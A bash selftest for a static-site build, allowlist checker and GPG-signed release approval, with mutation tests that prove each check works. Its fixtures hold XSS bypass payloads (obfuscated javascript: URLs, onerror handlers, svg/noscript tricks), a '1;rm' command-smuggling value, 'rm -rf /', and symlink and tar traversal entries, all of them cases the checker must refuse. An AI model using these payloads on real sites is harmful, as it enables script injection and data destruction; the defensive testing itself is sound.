#!/usr/bin/env bash
# Selftest of site-bauen.sh, site-freigabe-pruefen.sh, site-signieren.sh, site-signaturen-pruefen.sh and the stage-0 templates. Own temporary keys.
# Every rule has a counter-test: the thing must turn RED when the rule is broken; the checks that matter most are also run against a MUTATED COPY of
# the script (a switched-off comparison must be noticed). Exit 0 only when all pass.
# shellcheck disable=SC2015,SC2329  # "A && ok || bad": ok and bad never fail; helper functions are used through red/grn
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd); root=$(cd "$here/.." && pwd)
t=$(mktemp -d); export GNUPGHOME="$t/gh"; mkdir -m 700 "$GNUPGHOME"; trap 'gpgconf --kill gpg-agent >/dev/null 2>&1; rm -rf "$t"' EXIT
unset GITHUB_ACTIONS GITHUB_RUN_ID GITHUB_RUN_ATTEMPT; export SITE_MTIME=1700000000
fail=0; ok() { echo "ok   $1"; }; bad() { echo "FAIL $1"; fail=1; }
red() { local n=$1; shift; if "$@" >"$t/o" 2>&1; then bad "$n (was green)"; else ok "$n"; [ -z "${VERBOSE:-}" ] || sed "s/^/       /" "$t/o" | grep -E "RED|error|:" | head -2; fi; }
grn() { local n=$1; shift; if "$@" >"$t/o" 2>&1; then ok "$n"; else bad "$n"; sed 's/^/     /' "$t/o"; fi; }

# --- keys: approver (human, a primary key AND a signing subkey), release (CI), stranger
fp1() { gpg --batch --list-keys --with-colons "$1" | awk -F: '/^fpr:/{print $10; exit}'; }
mk() { gpg --batch --quiet --passphrase '' --quick-generate-key "$1" ed25519 sign 1d >/dev/null 2>&1; fp1 "$1"; }
appr=$(mk "approver@test"); rel=$(mk "release@test"); other=$(mk "stranger@test"); appr2=$(mk "approver2@test")
gpg --batch --quiet --passphrase '' --quick-add-key "$appr2" ed25519 sign 1d >/dev/null 2>&1
sub2=$(gpg --batch --list-keys --with-colons "$appr2" | awk -F: '/^sub:/{s=1} s&&/^fpr:/{print $10; exit}')
gpg --batch --export "$appr" > "$t/appr.pub"; gpg --batch --export "$other" > "$t/other.pub"; gpg --batch --export "$appr2" > "$t/appr2.pub"
gpg --batch --armor --export "$rel" > "$t/rel.pub.asc"
gpg --batch --armor --export-secret-keys "$rel" > "$t/rel.sec.asc"
for k in appr other appr2; do gpg --batch --no-default-keyring --keyring "$t/$k.ring" --import "$t/$k.pub" 2>/dev/null; done
printf '%s\n' "# allowed signing keys" "$appr" > "$t/allowed"
[ -n "$sub2" ] && [ "$sub2" != "$appr2" ] && ok "setup: second approver has a separate signing subkey" || bad "setup: subkey"

# --- the folder (written here: no placeholder pages are kept in git; the input of site-bauen is a folder a person approved)
mkdir -p "$t/src/de"; printf 'p{color:#111}\n@media (prefers-color-scheme:dark){p{color:#eee}}\n' > "$t/src/s.css"
printf '<!doctype html>\n<html lang="en"><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src \047self\047; script-src \047none\047"><title>t</title><link rel="stylesheet" href="s.css"></head><body><p>hello</p><a href="https://example.org/x">out</a> <a href="/de/">de</a></body></html>\n' > "$t/src/index.html"
printf '<!doctype html>\n<html lang="de"><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="default-src \047self\047"><title>t</title></head><body><p>hallo</p></body></html>\n' > "$t/src/de/index.html"
# the one place of the host names: site.toml (fixture values only; no template, script or test other than fixtures names a host)
mktoml() { # file primary mode [alias]
  printf 'schema = 1\npurpose = "website"\n[names]\nprimary = "%s"\naliases = [%s]\n[dns]\nrecords = ["A", "AAAA", "CAA"]\n[acme]\nmethod = "http-01"\n[csp]\nmode = "%s"\n' "$2" "${4:+\"$4\"}" "$3" > "$1"; }
mktoml "$t/src/site.toml" helfa.org static www.helfa.org
B="$here/site-bauen.sh"
grn "build: good folder" "$B" build "$t/src" "$t/dist" helfa.org 0.0.1
tree=$(grep '^tree-sha256=' "$t/o" | cut -d= -f2); tarh=$(grep '^tar-sha256=' "$t/o" | cut -d= -f2)
[ -n "$tree" ] && [ -n "$tarh" ] && ok "build prints the tree hash and the tarball hash" || bad "build prints the hashes"
[ "$tarh" = "$(sha256sum "$t/dist/helfa.org-0.0.1-site.tar.gz" | cut -d' ' -f1)" ] && ok "tar-sha256 is the hash of the tarball file" || bad "tar-sha256 of the file"
grn "build: second build into another folder is byte-identical (same hash)" bash -c "'$B' build '$t/src' '$t/dist2' helfa.org 0.0.1 && cmp '$t/dist/helfa.org-0.0.1-site.tar.gz' '$t/dist2/helfa.org-0.0.1-site.tar.gz'"
red "build: non-empty outdir refused" "$B" build "$t/src" "$t/dist" helfa.org 0.0.1
red "build: bad version refused" "$B" build "$t/src" "$t/o-v" helfa.org "1;rm"
red "build: without SITE_MTIME is refused (a fixed time would keep the ETag of a same-size file)" env -u SITE_MTIME "$B" build "$t/src" "$t/o-nm" helfa.org 0.0.1
grn "build: another release time gives other tarball bytes (so another ETag)" bash -c "SITE_MTIME=1700001000 '$B' build '$t/src' '$t/dist-mt' helfa.org 0.0.1 && ! cmp -s '$t/dist/helfa.org-0.0.1-site.tar.gz' '$t/dist-mt/helfa.org-0.0.1-site.tar.gz'"
grep -q '"mtime": 1700000000' "$t/dist/helfa.org-0.0.1-manifest.json" && ok "manifest records the release time" || bad "manifest records the release time"
# site.toml, the only place of the host names
tm() { rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; printf '%s\n' "$2" > "$t/f-$1/site.toml"; red "site.toml: $1 is refused" "$B" check "$t/f-$1"; }
rm -rf "$t/f-nom"; cp -r "$t/src" "$t/f-nom"; rm "$t/f-nom/site.toml"; red "site.toml: missing is refused" "$B" check "$t/f-nom"
tm junk 'not = [toml'
tm dns01 $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "dns-01"'
tm badname $'schema = 1\npurpose = "website"\n[names]\nprimary = "A b.example.org"\n[acme]\nmethod = "http-01"'
tm aliastwice $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\naliases = ["a.example.org"]\n[acme]\nmethod = "http-01"'
tm recordtype $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[dns]\nrecords = ["MX"]\n[acme]\nmethod = "http-01"'
tm extrakey $'schema = 1\npurpose = "website"\ntoken = "x"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "http-01"'
tm cspquote $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "http-01"\n[csp]\npolicy = "a\\"b"'
tm nl-primary $'schema = 1\npurpose = "website"\n[names]\nprimary = "one.example.org\\n"\n[acme]\nmethod = "http-01"'
tm nl-alias $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\naliases = ["b.example.org\\n"]\n[acme]\nmethod = "http-01"'
tm nl-csp $'schema = 1\npurpose = "website"\n[names]\nprimary = "a.example.org"\n[acme]\nmethod = "http-01"\n[csp]\npolicy = "default-src self\\n"'
long=$(python3 -c 'print(".".join(["a" * 60] * 5) + ".example.org")')
tm toolong "$(printf 'schema = 1\npurpose = "website"\n[names]\nprimary = "%s"\n[acme]\nmethod = "http-01"' "$long")"
grn "site.toml: the control of the long-name case is a valid name when it is short (the rule is the length)" bash -c "cp -r '$t/src' '$t/f-shortctl' && printf 'schema = 1\\npurpose = \"website\"\\n[names]\\nprimary = \"%s\"\\n[acme]\\nmethod = \"http-01\"\\n' 'a.example.org' > '$t/f-shortctl/site.toml' && '$B' check '$t/f-shortctl'"
cp -r "$t/src" "$t/f-nlname"; : > "$t/f-nlname/"$'a.html\n'; red "folder: a file name with a line break is refused" "$B" check "$t/f-nlname"
# mutations of site_manifest.py: the old `$` anchor and the missing length rule turn the cases green
mkdir -p "$t/mut3"; cp "$here/site_manifest.py" "$t/mut3/site_manifest.py"; sed -i 's/DOMAIN.fullmatch(n)/DOMAIN.match(n + "")/; s/^DOMAIN = re.compile(r"(/DOMAIN = re.compile(r"^(/; s/{2,63}")  # used/{2,63}$")  # used/' "$t/mut3/site_manifest.py"
grep -q 'DOMAIN.match' "$t/mut3/site_manifest.py" && ok "mutation: the old \`^...\$\` match put into a copy" || bad "mutation: site_manifest sed did not apply"
grn "mutation control: with the old \`$\` anchor the name with a line break is GREEN" python3 -I "$t/mut3/site_manifest.py" "$t/f-nl-primary/site.toml"
cp "$here/site_manifest.py" "$t/mut3/site_manifest.py"; sed -i 's/len(n) > 253 or //' "$t/mut3/site_manifest.py"
grn "mutation control: without the length rule the name of 316 characters is GREEN" python3 -I "$t/mut3/site_manifest.py" "$t/f-toolong/site.toml"
rm -rf "$t/f-cspm"; cp -r "$t/src" "$t/f-cspm"; mktoml "$t/f-cspm/site.toml" helfa.org passthrough; red "site.toml: csp.mode passthrough in a static check is refused" "$B" check "$t/f-cspm"

# --- folder check: allowlist (mode static). Each case: name | file | content appended (or the whole file for new files)
fc() { # name file content
  rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; mkdir -p "$(dirname "$t/f-$1/$2")"; printf '%s\n' "$3" >> "$t/f-$1/$2"
  red "folder: $1 is refused" "$B" check "$t/f-$1"; }
fc script index.html '<script>1</script>'
fc script-upper index.html '<SCRIPT SRC=x.js></SCRIPT>'
fc onerror index.html '<img src="x.png" onerror="alert(1)">'
fc onclick-unquoted index.html '<a href="/x" onclick=alert(1)>x</a>'
fc js-url index.html '<a href="javascript:alert(1)">x</a>'
fc js-url-entity index.html '<a href="jav&#x61;script:alert(1)">x</a>'
fc ext-img-double index.html '<img src="https://x.test/a.png">'
fc ext-img-single index.html "<img src='https://x.test/a.png'>"
fc ext-img-unquoted index.html '<img src=https://x.test/a.png>'
fc ext-img-protocol-relative index.html '<img src="//x.test/a.png">'
fc meta-refresh index.html '<meta http-equiv=refresh content="0;url=https://fremd.test/">'
fc css-url index.html "<style>body{background:url('https://x.test/a.png')}</style>"
fc css-import style.css '@import "x.css";'
fc css-file-url style.css 'a{background:url(https://x.test/a.png)}'
fc style-attr index.html '<p style="background:url(//x.test/a.png)">x</p>'
fc srcset index.html '<img srcset="a.png 1x, https://x.test/b.png 2x" src="a.png">'
fc svg-image-href logo.svg '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://x.test/a.png"/></svg>'
fc svg-script logo.svg '<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'
fc link-stylesheet index.html '<link rel="stylesheet" href="https://x.test/a.css">'
fc iframe index.html '<iframe src="x.html"></iframe>'
fc data-url index.html '<a href="data:text/html;base64,AAAA">x</a>'
fc secret index.html 'password = abc'
fc private-key index.html '-----BEGIN PRIVATE KEY-----'
fc dotfile-env .env 'X=1'
fc dotfolder-git .git/config 'url = https://user:pw@example.org/'
fc dotfile-htaccess .htaccess 'x'
fc exe-type run.exe 'MZ'
fc shell-type install.sh 'rm -rf /'
fc php-type x.php '<?php ?>'
fc js-in-static app.js 'alert(1)'
fc no-extension README 'x'
# B4: the bypasses of the Opus re-review (each was GREEN before the allowlist) and the rest of the allowlist; each must be red
fc svg-style-img index.html '<svg><style><img src=x onerror=alert(1)></style></svg>'
fc svg-style-plain index.html '<svg><style>p{color:red}</style></svg>'
fc math-style-img index.html '<math><style><img src=x onerror=alert(1)></style></math>'
fc noscript-title index.html '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>'
fc backslash-src index.html '<img src="\\fremd.example/x.png">'
fc backslash-src2 index.html '<img src="/\fremd.example/x.png">'
fc backslash-href index.html '<a href="\\fremd.example/">x</a>'
fc css-escape-url style.css 'a{background:u\72l(https://x.test/a.png)}'
fc css-escape-url2 style.css 'a{background:url(\68ttps://x.test/a.png)}'
fc css-escape-import style.css '@\69mport "https://x.test/a.css";'
fc css-font-face style.css '@font-face{font-family:x;src:local(x)}'
fc css-image-set style.css 'a{background:image-set("a.png" 1x)}'
fc svg-set-href index.html '<svg><image><set attributeName="href" to="https://x.test/a.png"/></image></svg>'
fc svg-animate index.html '<svg><a><animate attributeName="href" values="java&#x73;cript:alert(1)"/></a></svg>'
fc svg-file logo.svg '<svg xmlns="http://www.w3.org/2000/svg"></svg>'
fc style-element index.html '<style>p{color:red}</style>'
fc style-attr-plain index.html '<p style="color:red">x</p>'
fc template index.html '<template><img src=x onerror=alert(1)></template>'
fc xmp index.html '<xmp><img src=x onerror=1></xmp>'
fc textarea index.html '<textarea></textarea><img src=x onerror=1>'
fc comment index.html '<!-- x --><p>x</p>'
fc comment-bang index.html '<!--><img src=x onerror=1>-->'
fc cdata index.html '<![CDATA[ x ]]>'
fc second-doctype index.html '<!DOCTYPE html>'
fc stray-lt index.html '<p>a < b</p>'
fc attr-single-quote index.html "<a href='x.html'>x</a>"
fc attr-slash-separator index.html '<a/href="x.html"/title="y">x</a>'
fc attr-twice index.html '<a href="x.html" href="https://x.test/">x</a>'
fc unknown-attr index.html '<p data-x="1">x</p>'
fc unknown-tag index.html '<blink>x</blink>'
fc form index.html '<form action="x"><input type="text"></form>'
fc input-text index.html '<input type="text">'
fc base index.html '<base href="https://x.test/">'
fc meta-set-cookie index.html '<meta http-equiv="set-cookie" content="a=b">'
fc link-preload index.html '<link rel="preload" href="a.css" as="style">'
fc link-stylesheet-abs index.html '<link rel="stylesheet" href="https://x.test/a.css">'
fc link-stylesheet-slashes index.html '<link rel="stylesheet" href="//x.test/a.css">'
fc img-ext-colon index.html '<img src="http://x.test/a.png">'
fc href-entity-colon index.html '<a href="javascript&colon;alert(1)">x</a>'
fc href-ws-js index.html '<a href="java	script:alert(1)">x</a>'
fc href-ftp index.html '<a href="ftp://x.test/f">x</a>'
fc xml-xhtml-root sitemap.xml '<html xmlns="http://www.w3.org/1999/xhtml"><body><img src=x onerror=alert(1)></body></html>'
fc xml-cdata-script sitemap.xml '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script></urlset>'
# the page's own CSP: required, first in head, strict
nocsp() { # name replacement-for-the-CSP-meta
  rm -rf "$t/f-$1"; cp -r "$t/src" "$t/f-$1"; python3 -I - "$t/f-$1/index.html" "$2" <<'PY'
import re, sys
p, rep = sys.argv[1:3]
s = open(p).read(); s = re.sub(r'<meta http-equiv="Content-Security-Policy"[^>]*>', lambda _: rep, s); open(p, "w").write(s)
PY
  red "folder: $1 is refused" "$B" check "$t/f-$1"; }
nocsp csp-missing ''
nocsp csp-unsafe-inline "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self' 'unsafe-inline'\">"
nocsp csp-external-host '<meta http-equiv="Content-Security-Policy" content="default-src https://x.test">'
nocsp csp-no-default "<meta http-equiv=\"Content-Security-Policy\" content=\"img-src 'self'\">"
nocsp csp-wildcard '<meta http-equiv="Content-Security-Policy" content="default-src *">'
nocsp csp-empty '<meta http-equiv="Content-Security-Policy" content="">'
rm -rf "$t/f-csp-late"; cp -r "$t/src" "$t/f-csp-late"; python3 -I - "$t/f-csp-late/index.html" <<'PY'
import re, sys
p = sys.argv[1]; s = open(p).read()
m = re.search(r'<meta http-equiv="Content-Security-Policy"[^>]*>', s); s = s.replace(m.group(0), ""); s = s.replace('<link rel="stylesheet" href="s.css">', '<link rel="stylesheet" href="s.css">' + m.group(0)); open(p, "w").write(s)
PY
red "folder: csp-late (after the style sheet link) is refused" "$B" check "$t/f-csp-late"
rm -rf "$t/f-csp-de"; cp -r "$t/src" "$t/f-csp-de"; sed -i 's#<meta http-equiv="Content-Security-Policy"[^>]*>##' "$t/f-csp-de/de/index.html"; red "folder: csp missing on a sub page is refused" "$B" check "$t/f-csp-de"
# what the exporter fs-text-html writes (frame, short navigation, table, task box, footnote, callout, sitemap) must still pass
rm -rf "$t/f-exp"; cp -r "$t/src" "$t/f-exp"; cat > "$t/f-exp/de/index.html" <<'EOF'
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>T &amp; U</title>
<meta name="description" content="a &lt; b &quot;q&quot; &#39;s&#39;">
<link rel="canonical" href="https://one.example.org/de/">
<link rel="alternate" hreflang="en" href="https://one.example.org/">
<link rel="stylesheet" href="/s.css">
</head>
<body>
<a class="skip" href="#main">Skip</a>
<header><p class="site">S</p><nav class="langs" aria-label="L"><ul><li><a href="/" hreflang="en" lang="en" aria-current="true">English</a></li></ul></nav></header>
<div class="layout"><nav class="side" aria-label="N"><ul><li><a href="/de/" aria-current="page">x</a></li></ul></nav>
<main id="main"><h1 id="t">T</h1><p>a &lt; b <a href="mailto:x@example.org?subject=a&amp;b=c">m</a><sup id="fnref-1"><a href="#fn-1">1</a></sup></p>
<table><thead><tr><th scope="col" class="al-l">h</th></tr></thead><tbody><tr><td class="al-r">c</td></tr></tbody></table>
<ul><li class="task"><label><input type="checkbox" disabled checked> x</label></li></ul>
<img src="a.png" alt="" width="10" height="10" loading="lazy"><details open><summary>s</summary><p>x</p></details><hr><br>
<aside role="note" class="callout"><p class="callout-title">t</p></aside><pre><code>a &lt;b&gt;</code></pre><ol start="3"><li id="fn-1">n</li></ol>
</main></div>
<footer><p>f</p></footer>
</body>
</html>
EOF
printf 'PNG' > "$t/f-exp/a.png"
printf '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml"><url><loc>https://one.example.org/</loc><xhtml:link rel="alternate" hreflang="de" href="https://one.example.org/de/"/></url></urlset>\n' > "$t/f-exp/sitemap.xml"
grn "folder: what the exporter writes passes (frame, nav, table, task box, footnote, callout, sitemap)" "$B" check "$t/f-exp"
# mutations of the checker (on a copy): the bypass turns GREEN when its rule is taken out, so the red cases above really come from that rule
mkdir -p "$t/mut2"; cp "$here"/site-bauen.sh "$here"/site-lib.sh "$here"/site_manifest.py "$here"/site-tar-pruefen.py "$t/mut2/"
mutate() { # name sed-expression: a changed copy of site-pruefen.py
  cp "$here/site-pruefen.py" "$t/mut2/site-pruefen.py"; sed -i "$2" "$t/mut2/site-pruefen.py"
  if cmp -s "$here/site-pruefen.py" "$t/mut2/site-pruefen.py"; then bad "mutation $1: the sed did not apply (the script changed: adjust the test)"; fi
}
mutate tags 's/^HTML_TAGS = {"html"/HTML_TAGS = {"svg", "style", "math", "noscript", "template", "xmp", "html"/'
grn "mutation control: with svg/style/math on the tag list the svg-style markup is GREEN (the tag allowlist is what refuses it; the strict grammar is a second wall for the img bypass)" "$t/mut2/site-bauen.sh" check "$t/f-svg-style-plain"
red "mutation: the tag list changed, the svg-style-img bypass is still red (the strict tag grammar is a second, independent wall)" "$t/mut2/site-bauen.sh" check "$t/f-svg-style-img"
mutate backslash 's/if "\\\\" in value or CTRL.search(value) or re.search(r"\\s", value):/if False:/'
grn "mutation control: without the backslash rule the backslash address is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-backslash-src"
mutate csp 's/if not rest or rest\[0\]\[0\] != "meta" or (rest\[0\]\[1\].get("http-equiv") or "").lower() != "content-security-policy":/if False:/'
grn "mutation control: without the required CSP meta a page without it is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-csp-missing"
mutate cspvalue 's/if not toks\[1:\] or any(t not in ("'"'self'"'", "'"'none'"'") for t in toks\[1:\]):/if False:/'
grn "mutation control: without the policy value rule unsafe-inline is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-csp-unsafe-inline"
mutate css 's/^CSS_BAD = .*/CSS_BAD = (/; s/^           "<", .*$/           )/'
grn "mutation control: without the CSS rules the escaped url( is GREEN" "$t/mut2/site-bauen.sh" check "$t/f-css-escape-url"
cp -r "$t/src" "$t/bad-link"; ln -s /etc/passwd "$t/bad-link/x.txt"; red "folder: symlink refused" "$B" check "$t/bad-link"
cp -r "$t/src" "$t/bad-dlink"; ln -s /etc "$t/bad-dlink/dir"; red "folder: symlink to a folder refused" "$B" check "$t/bad-dlink"
cp -r "$t/src" "$t/bad-name"; : > "$t/bad-name/a b.html"; red "folder: unsafe file name refused" "$B" check "$t/bad-name"
cp -r "$t/src" "$t/bad-suid"; chmod 4755 "$t/bad-suid/index.html"; red "folder: set-uid bit refused" "$B" check "$t/bad-suid"
mkdir "$t/noindex"; echo x > "$t/noindex/a.html"; red "folder: no index.html refused" "$B" check "$t/noindex"
grn "folder: ordinary link, style and image types pass" bash -c "cp -r '$t/src' '$t/f-ok' && printf 'p{color:red}' > '$t/f-ok/s.css' && printf 'PNG' > '$t/f-ok/a.png' && printf '<a href=\"mailto:x@example.org\">m</a><img src=\"a.png\">' >> '$t/f-ok/index.html' && '$B' check '$t/f-ok'"
# mode passthrough: a person's own HTML with JavaScript, explicitly; allowlist and log stay
rm -rf "$t/pt"; cp -r "$t/src" "$t/pt"; printf '<script src="https://cdn.example/x.js"></script><script>1</script>\n' >> "$t/pt/index.html"; echo 'document.title="x"' > "$t/pt/app.js"; mktoml "$t/pt/site.toml" helfa.org passthrough
grn "passthrough: own HTML with scripts passes" "$B" --passthrough check "$t/pt"
grep -q '^log: index.html sha256=[0-9a-f]\{64\} size=[0-9]* script external' "$t/o" && grep -q '^log: app.js .* script' "$t/o" && ok "passthrough: every file is logged (hash, size, script/external)" || bad "passthrough log"
red "passthrough: the same folder is refused in static mode" "$B" check "$t/pt"
for case in "dotfile|.env|X=1" "exe|run.exe|MZ" "secret|s.js|var token = 'abc'" "key|k.txt|-----BEGIN PRIVATE KEY-----"; do
  IFS='|' read -r n f c <<<"$case"; rm -rf "$t/pt-$n"; cp -r "$t/pt" "$t/pt-$n"; printf '%s\n' "$c" > "$t/pt-$n/$f"; red "passthrough: $n is still refused" "$B" --passthrough check "$t/pt-$n"
done
grn "passthrough: build records the mode" bash -c "'$B' --passthrough build '$t/pt' '$t/dpt' helfa.org 0.0.1 | grep -q '^mode=passthrough' && grep -q '\"mode\": \"passthrough\"' '$t/dpt/helfa.org-0.0.1-manifest.json'"

# --- mutation of the build script: the byte comparison of the double build must bite (nothing else makes it red here)
mkdir -p "$t/mut"; cp "$here"/site-bauen.sh "$here"/site-lib.sh "$here"/site_manifest.py "$here"/site-pruefen.py "$here"/site-tar-pruefen.py "$t/mut/"
sed -i 's/"tools": {"tar": tarv, "gzip": gzv}, "files": files}/"tools": {"tar": tarv, "gzip": gzv}, "nonce": os.urandom(8).hex(), "files": files}/' "$t/mut/site-bauen.sh"
grep -q 'os.urandom' "$t/mut/site-bauen.sh" && ok "mutation: nondeterminism injected into a copy" || bad "mutation: injection did not apply (the script changed: adjust the test)"
red "mutation: a non-reproducible build is refused (the byte comparison is alive)" "$t/mut/site-bauen.sh" build "$t/src" "$t/m1" helfa.org 0.0.1
# shellcheck disable=SC2016  # the pattern is meant literally
sed -i 's/if ! diff -r "\$out" "\$chk\/again" >\/dev\/null; then/if false \&\& ! diff -r "$out" "$chk\/again" >\/dev\/null; then/' "$t/mut/site-bauen.sh"
grep -q 'if false &&' "$t/mut/site-bauen.sh" && ok "mutation: comparison switched off in the copy" || bad "mutation: switch-off did not apply (the script changed: adjust the test)"
grn "mutation control: with the comparison off the same build passes, so the red above is the comparison" "$t/mut/site-bauen.sh" build "$t/src" "$t/m2" helfa.org 0.0.1

# --- the tarball allowlist (B2): nothing but plain files and folders; each odd entry is refused BEFORE unpacking
mktar() { python3 -I - "$1" "$2" <<'PY'
import io, sys, tarfile
kind, out = sys.argv[1:3]
tf = tarfile.open(out, "w:gz", format=tarfile.GNU_FORMAT)
def add(name, typ=tarfile.REGTYPE, mode=0o644, data=b"x", link="", uid=0, mtime=1700000000):
    i = tarfile.TarInfo(name); i.type = typ; i.mode = mode; i.uid = i.gid = uid; i.mtime = mtime; i.linkname = link
    i.size = len(data) if typ == tarfile.REGTYPE else 0
    tf.addfile(i, io.BytesIO(data) if typ == tarfile.REGTYPE else None)
add("./", tarfile.DIRTYPE, 0o755); add("./index.html", data=b"<p>x</p>")
{"good": lambda: None,
 "symlink": lambda: add("./de/leak.html", tarfile.SYMTYPE, 0o777, link="/etc/passwd"),
 "hardlink": lambda: add("./h.html", tarfile.LNKTYPE, 0o644, link="./index.html"),
 "device": lambda: add("./dev", tarfile.CHRTYPE, 0o644),
 "dir777": lambda: add("./de/", tarfile.DIRTYPE, 0o777),
 "setuid": lambda: add("./x.html", mode=0o4755),
 "exec0700": lambda: add("./x.html", mode=0o700),
 "absolute": lambda: add("/etc/x.html"),
 "dotdot": lambda: add("./../x.html"),
 "dotfile": lambda: add("./.env"),
 "owner": lambda: add("./x.html", uid=1000),
 "mtime": lambda: add("./x.html", mtime=1700000999),
 "mtime0": lambda: (add("./x.html", mtime=0)),
 "twice": lambda: add("./index.html"),
 "emptydir-ok": lambda: add("./empty/", tarfile.DIRTYPE, 0o755)}[kind]()
tf.close()
PY
}
mktar good "$t/tar-good.tgz"; grn "tarball check: a tarball like site-bauen writes passes" python3 -I "$here/site-tar-pruefen.py" "$t/tar-good.tgz"
grn "tarball check: the real built tarball passes" python3 -I "$here/site-tar-pruefen.py" "$t/dist/helfa.org-0.0.1-site.tar.gz"
for k in symlink hardlink device dir777 setuid exec0700 absolute dotdot dotfile owner mtime mtime0 twice; do mktar "$k" "$t/tar-$k.tgz"; red "tarball check: $k is refused" python3 -I "$here/site-tar-pruefen.py" "$t/tar-$k.tgz"; done
echo "not a tar" > "$t/tar-junk.tgz"; red "tarball check: junk is refused" python3 -I "$here/site-tar-pruefen.py" "$t/tar-junk.tgz"

# --- the approval
exp=$(date -u -d '+24 hours' +%Y-%m-%dT%H:%M:%SZ)
approval() { # file tree tar run expires [gate] [mode]
  printf 'gate: %s\nname: helfa.org\nversion: 0.0.1\nmode: %s\ntree-sha256: %s\ntar-sha256: %s\nrun-id: %s\nexpires: %s\n' "${6:-site-signieren}" "${7:-static}" "$2" "$3" "$4" "$5" > "$1"; }
signit() { gpg --batch --yes --local-user "$1" --armor --detach-sign --output "$2.asc" "$2" 2>/dev/null; }
approval "$t/a.txt" "$tree" "$tarh" run-0001 "$exp"; signit "$appr" "$t/a.txt"
check() { "$here/site-freigabe-pruefen.sh" "${6:-$t/dist}" "$1" "$1.asc" "${2:-$t/appr.ring}" "${3:-$t/allowed}" "${4:-run-0001}" "${5:-}"; }
grn "approval: good one passes" check "$t/a.txt"
red "approval: other run id (replay) is red" check "$t/a.txt" "" "" run-0002
zero=0000000000000000000000000000000000000000000000000000000000000000
approval "$t/b.txt" "$(printf x | sha256sum | cut -d' ' -f1)" "$tarh" run-0001 "$exp"; signit "$appr" "$t/b.txt"; red "approval: for another tree hash is red" check "$t/b.txt"
approval "$t/b2.txt" "$tree" "$zero" run-0001 "$exp"; signit "$appr" "$t/b2.txt"; red "approval: for another tarball hash (the bytes) is red" check "$t/b2.txt"
approval "$t/c.txt" "$tree" "$tarh" run-0001 "$(date -u -d '-1 hour' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/c.txt"; red "approval: expired is red" check "$t/c.txt"
approval "$t/d.txt" "$tree" "$tarh" run-0001 "$(date -u -d '+10 days' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d.txt"; red "approval: valid for more than 72 hours is red" check "$t/d.txt"
# 72 hours count from the SIGNATURE time: checked 48 h after signing, an approval that runs to signature+70h is fine, one that runs to check+70h is not
now48=$(( $(date -u +%s) + 48 * 3600 ))
approval "$t/d2.txt" "$tree" "$tarh" run-0001 "$(date -u -d '+70 hours' +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d2.txt"; grn "approval: signature+70h, checked 48 h after signing, is fine" check "$t/d2.txt" "" "" "" "$now48"
approval "$t/d3.txt" "$tree" "$tarh" run-0001 "$(date -u -d "@$((now48 + 70 * 3600))" +%Y-%m-%dT%H:%M:%SZ)"; signit "$appr" "$t/d3.txt"; red "approval: check time+70h (more than 72 h after signing) is red" check "$t/d3.txt" "" "" "" "$now48"
red "approval: signature dated in the future (check time is a day earlier) is red" check "$t/a.txt" "" "" "" "$(( $(date -u +%s) - 86400 ))"
approval "$t/e.txt" "$tree" "$tarh" run-0001 "$exp"; signit "$other" "$t/e.txt"
red "approval: signed by a stranger (not on the list) is red" check "$t/e.txt" "$t/other.ring"
red "approval: stranger's key not in the keyring is red" check "$t/e.txt"
approval "$t/f.txt" "$tree" "$tarh" run-0001 "$exp" other-gate; signit "$appr" "$t/f.txt"; red "approval: another gate is red" check "$t/f.txt"
approval "$t/f2.txt" "$tree" "$tarh" run-0001 "$exp" site-signieren passthrough; signit "$appr" "$t/f2.txt"; red "approval: mode passthrough against a static build is red" check "$t/f2.txt"
approval "$t/f3.txt" "$tree" "$tarh" run-0001 "$exp" site-signieren wild; signit "$appr" "$t/f3.txt"; red "approval: unknown mode is red" check "$t/f3.txt"
cp "$t/a.txt" "$t/g.txt"; cp "$t/a.txt.asc" "$t/g.txt.asc"; echo "extra: 1" >> "$t/g.txt"; red "approval: text changed after signing is red" check "$t/g.txt"
cp "$t/a.txt" "$t/h.txt"; : > "$t/h.txt.asc"; red "approval: empty signature file is red" check "$t/h.txt"
red "approval: missing approval file is red" check "$t/none.txt"
: > "$t/empty-allowed"; red "approval: empty allowed list is red" check "$t/a.txt" "" "$t/empty-allowed"
printf '%s\n' "not-a-fingerprint" > "$t/junk-allowed"; red "approval: junk in the allowed list is red" check "$t/a.txt" "" "$t/junk-allowed"
approval "$t/i.txt" "$tree" "$tarh" run-0001 "$exp"; echo "tree-sha256: $tree" >> "$t/i.txt"; signit "$appr" "$t/i.txt"; red "approval: key twice is red" check "$t/i.txt"
red "approval: unsigned text (a plain event) is red" "$here/site-freigabe-pruefen.sh" "$t/dist" "$t/a.txt" "$t/none.asc" "$t/appr.ring" "$t/allowed" run-0001
# the signing SUBKEY is what is pinned: the primary fingerprint does not stand for a software subkey under it
